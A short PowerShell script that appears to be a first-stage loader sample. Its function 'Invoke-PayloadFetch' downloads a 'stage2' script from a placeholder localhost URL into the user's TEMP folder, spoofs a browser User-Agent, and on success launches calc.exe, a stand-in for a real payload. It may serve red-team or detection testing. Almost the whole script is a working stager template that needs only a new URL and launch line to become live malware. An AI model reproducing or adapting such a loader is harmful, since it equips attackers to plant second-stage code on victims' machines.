
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://127.0.0.1/stage2.ps1",
    [string]$DropPath = "$env:TEMP\stage2.bin",
    [int]$ConnectionTimeout = 223,
    [string]$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$OperationResult = Invoke-PayloadFetch -SourceUrl $FetchUrl -DestinationPath $DropPath -TimeoutSec $ConnectionTimeout -UserAgent $UserAgent
if ($OperationResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
